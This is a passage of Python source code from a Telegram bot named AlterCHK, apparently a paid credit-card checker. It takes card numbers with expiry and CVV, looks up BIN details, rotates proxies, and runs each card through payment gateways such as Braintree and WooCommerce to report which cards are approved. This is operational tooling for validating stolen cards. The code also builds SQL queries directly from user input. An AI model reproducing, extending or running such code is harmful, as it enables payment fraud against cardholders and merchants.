            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDbr import ZarekCHK
        CheckRecive = await ZarekCHK(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#




@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["bra"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Baruch [ Auth ]'
    TwoNameGateway = 'Gateway ↯ Baruch [ Auth ]'
    ThreeGateway = 'Gateway 🔥 Baruch [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('bra')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDbra import BraintreeWoo
        CheckRecive = await BraintreeWoo(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'

        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#



@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["kill"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Kalaka [ 20$ ]'
    TwoNameGateway = 'Gateway ↯ Kalaka [ 20$ ]'
    ThreeGateway = 'Gateway 🔥 Kalaka [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('kill')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
